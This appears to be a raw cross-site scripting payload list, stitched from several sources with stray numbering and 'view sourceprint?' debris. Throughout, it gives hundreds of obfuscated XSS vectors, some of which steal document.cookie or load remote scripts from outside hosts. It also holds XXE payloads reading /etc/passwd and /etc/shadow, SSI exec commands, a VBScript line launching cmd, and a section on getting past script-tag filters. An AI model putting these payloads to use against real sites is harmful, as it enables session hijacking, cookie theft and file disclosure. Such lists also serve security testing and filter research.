39) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<iframe SRC=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41>
<a href=&#x20&#100&#97&#116&#97&#x3atext/html&#59b&#x61se6&#x34&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>test</a>
String.prototype.can_i_has_alert('?') = function() { this.toNumber(alert('okthxbye!')); }; this.can_i_has_alert('?');
49) <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"/-alert(1)//><img src=1 onerror=alert(1)>'
<!DOCTYPE x [ <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "alert(1)"> ]><img />
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
31) <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script​​​​​​​​​​​​
document.evaluate('//body', document, null, XPathResult.ANY_TYPE, null).iterateNext().innerHTML='<iframe onload=alert(1)>'
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert(/XSS/)" onclick="alert(/XSS/)"></div>
<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
<@uni>0<@/uni><@uni>["<@/uni><@hex>eval<@/hex>"<@uni>]<@/uni><@uni>(<@/uni><@uni>'<@/uni><@hex>alert(1)<@/hex>'<@uni>)<@/uni>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
44) <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>​
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
<p><a onclick="i=createElement('iframe');i.src='javascript:alert(/XSS/)';x=parentNode;x.appendChild(i);" href="#">Test</a></p>
<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="javascript:alert(1)"><input value="XXX" type="submit"/></form>
{a=(typeof (/./[-1])),b=a.replace(/s/,(a[0]).toUpperCase()),self['ev'+'al'](b+'.'+'fromµharµode'.replace(/µ/g,'C')+'(1e0*82)')}
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
I:would=/l/i;ke:to=alert;so=/methin/g;ind=/ef/i;nit='ely',but='sadly';I:do{_='not';know=/how/;to(_)}while(/remainin/g<'legible')
23) <a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<button style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert(/XSS/)" onclick="alert(/XSS/)"></button>
<script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10 <script src="\\example.com\foo.js"></script> // Safari 5.0
<div/style=<@backslashesc>-moz-binding<@/backslashesc>:<@backslashesc>url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)<@/backslashesc>>
20) <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<embed src="javascript:alert(1)"> <img src="javascript:alert(1)"> <image src="javascript:alert(1)"> <script src="javascript:alert(1)">
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);
'\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'.replace(/\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029/,\u0065\u0076\u0061\u006c)
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
29) <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<svg xmlns="http://www.w3.org/2000/svg"> <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler> </svg>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<li style=list-style:url() onerror=alert(1)> <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
eval(dispatchEvent[-5][4]+enableExternalCapture[-5][4]+dispatchEvent[-5][10]+enableExternalCapture[-5][10]+dispatchEvent[-5][5]+/(1)/[-1]) 
<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
<div style=background:url('http://mail.yahoo.com/'logo.jpg;x:\65\78\70\72\65\73\73\69\6f\6e\28\61\6c\65\72\74\28\31\29\29;'xxx:xx');></div> 
<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<@uni>1<@/uni> + <@uni>1<@/uni><@uni>[<@/uni>'<@oct>eval<@/oct><@oct><@/oct>'<@uni>]<@/uni><@uni>(<@/uni>'<@oct>alert(1)<@/oct>'<@uni>)<@/uni>
<svg xmlns="http://www.w3.org/2000/svg"> <set attributeName="onmouseover" to="alert(1)"/> <animate attributeName="onunload" to="alert(1)"/> </svg>
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
({}.constructor.prototype.toString=function(){return "f".constructor.fromCharCode(95,95,112,97,114,101,110,116,95,95);}, y={},y[{}].alert('lose')) 
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
<@uni>e=0[<@/uni>'<@hex>ev<@/hex><@oct>al<@/oct>'<@uni>](<@/uni>'<@oct>b+z+61+b+z+6+c+b+z+65+b+z+72+b+z+74+b+z+28+b+z+31+b+z+29<@/oct>'<@uni>)<@/uni>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
javascript:b = /alert/.source; a = eval("b");; x = top["win"+"dow"];y=eval("doc_ument".replace("_",""));z = top["ev"+"al"]("y.co"+"okie"); x.alert(z); 
43) <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>​
eval(<x>{dispatchEvent[-5][4]}{enableExternalCapture[-5][4]}{dispatchEvent[-5][10]}{enableExternalCapture[-5][10]}{dispatchEvent[-5][5]}</x>..*+/(1)/[-1])
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
&lt;\sc\r\ipt&gt;ale\u0072t('SS\x58'.&#x73;&#x70;&#x6c;&#x69;&#x74;('').&#114;&#101;&#118;&#101;&#114;&#115;&#101;().&#x6a;&#x6f;&#105;&#110;(''))&lt;\/\sc\r\ipt&gt; 
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\0027\0058\0053\0053\0027\0029'\0029">
e(c(97)+c(108)+c(101)+c(114)+c(116)+c(40)+c(39)+c(79)+c(119)+c(110)+c(101)+c(100)+c(32)+c(98)+c(121)+c(32)+c(84)+c(101)+c(97)+c(109)+c(32)+c(78)+c(48)+c(48)+c(66)+c(33)+c(39)+c(41));
<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%33%33%37%29%3C%2F%73%63%72%69%70%74%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%33%33%37%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
<IMG&#x0D;SRC&#x0D;=&#x0D;"&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;'&#x0D;X&#x0D;S&#x0D;S&#x0D;'&#x0D;)&#x0D;"&#x0D;>&#x0D;
<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>
Dim a : Dim b : a = chr(87) + chr(83) + chr(99) + chr(114) + chr(105) + chr(112) + chr(116) + chr(46) + chr(83) + chr(104) + chr(101) + chr(108) + chr(108) : b = chr(99) + chr(109) + chr(100) : CreateObject(a).Run b
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"/-alert(1)//><img src=1 onerror=alert(1)>'<SCRIPT>alert("Test");iMg sRc=1.gif onerror = alert("1")><img src=foo.png onerror=alert(/xssed/) />
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>"></BODY></HTML>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
%27%22%3E%3C%2F%74%69%74%6C%65%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%33%33%37%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
%3C%69%6D%67%20%22%22%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
\u0065\u003d\u0030\u005b'\x65\x76\141\154'\u005d\u0028'\142\53\172\53\66\61\53\142\53\172\53\66\53\143\53\142\53\172\53\66\65\53\142\53\172\53\67\62\53\142\53\172\53\67\64\53\142\53\172\53\62\70\53\142\53\172\53\63\61\53\142\53\172\53\62\71'\u0029
%27%22%3E%3C%2F%74%69%74%6C%65%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%20%62%79%20%5C%6E%31%22%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%20%62%79%20%5C%6E%31%27%29%3B%22%3E%3C%2F%69%66%72%61%6D%65%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
<a x="javasc&#x0Aript:alert(1)" style="\000062\00065\68\0\00  \&#xA0\000061 vio\r:url\28#default#time2);\-\ \ \00006D\0006f\7A\2d \62	\000069 \06E din\g:url(test.xbl#xss);\-\00006F\0002d\6C \69 \6e	\00006B:attr(x);\-\00006F\0002d\6C \69 \6e	\00006B-s\ource:current" end=0 onend=alert(1)>XXX
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <feImage> <set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64, PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/> </feImage> </svg>
50) <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>​
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"><TABLE><TD BACKGROUND="javascript:alert('XSS')"><TABLE BACKGROUND="javascript:alert('XSS')"><FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <animation xlink:href="javascript:alert(1)"/> <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/> <foreignObject xlink:href="javascript:alert(1)"/> <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/> </svg>
18) <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>​
<input type="button" value="CHange Color!" onClick="document.bgColor='#cc2801'">



<input type="button" value="Get Cookie!" onClick=alert(document.cookie);>

<input type="button" value="Alert!" onClick=alert("XSS Hole");>

<INPUT type="button" value="Get Cookie String" onClick='alert(unescape(document.cookie))'>

<img src ="http://www.Yahoo.com/public/images/pic.jpg">

"><script>window.location="http://www.Yahoo.com"</script>


<image src="http://www.site.com/images/PIC.jpg" onLoad="showLoaded( );"><body onLoad="showLoaded(

);">



"><BODY onLoad="document.write('<center><h1>HACKED</h1><plaintext>OWNED!');">


<BODY onUnload=<script>"alert('bye now!')"</script>>


<BODY onLoad="alert("HACKED"); alert(document.cookie)">



"><script src=http://www.site.com/XSS.js></script>


"><plaintext>


<embed src="http://www.usher-lyrics.info/swf/usher-swf-i-need-a-girl.swf" autostart="true"

loop="true" hidden="true"></embed>


<script>for (;;);</script>


<iframe src="file://þ:/Test.txt">


>"<iframe src=http://www.Google.com width=815 height=505></script>


"><plaintext>

"><script>alert('Hacked');</script>

"><script>alert(document.cookie);</script>

<script>alert(String.fromCharCode(88,83,83))</script>

<script src=http://www.Site.com/XSS.js></script>

>"<iframe src=http://www.Site.com width=815 height=505></script>


<INPUT TYPE="TEXT" VALUE=""><plaintext>">
<img src=/ onerror=alert(0);>
''%22%3EXXX%3Cscript%3Ealert(1)%3C/script%3E3
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
view sourceprint?
1.'';!--"<XSS>=&amp;amp;{()}
view sourceprint?
1.<IMG SRC="javascript:alert('XSS');">
view sourceprint?
1.<IMG SRC=javascript:alert('XSS')>
view sourceprint?
1.<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
view sourceprint?
1.<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
view sourceprint?
1.<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
view sourceprint?
1.<IMG SRC="jav    ascript:alert('XSS');">
view sourceprint?
1.perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
view sourceprint?
1.<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
view sourceprint?
1."><iframe src=google.de></iframe>
view sourceprint?
1.<BODY BACKGROUND="javascript:alert('XSS')">
view sourceprint?
1.<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
view sourceprint?
1.<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
view sourceprint?
1.“><script >alert(document.cookie)</script>
view sourceprint?
1.%253cscript%253ealert(document.cookie)%253c/script%253e
view sourceprint?
1.“><s”%2b”cript>alert(document.cookie)</script>
view sourceprint?
1.%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
view sourceprint?
1.<img src=asdf onerror=alert(document.cookie)><script>alert(123)</script>
<script>alert("hellox worldss");</script>
javascript:alert("hellox worldss")
<img src="javascript:alert('XSS');">
<img src=javascript:alert(&quot;XSS&quot;)>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
“><script >alert(document.cookie)</script>


Bypass filter when it strips <script> tags:


%253cscript%253ealert(document.cookie)%253c/script%253e

“><s”%2b”cript>alert(document.cookie)</script>

“><ScRiPt>alert(document.cookie)</script>

“><<script>alert(document.cookie);//<</script>

foo%00<script>alert(document.cookie)</script>

<scr<script>ipt>alert(document.cookie)</scr</script>ipt>

%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E

 <IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
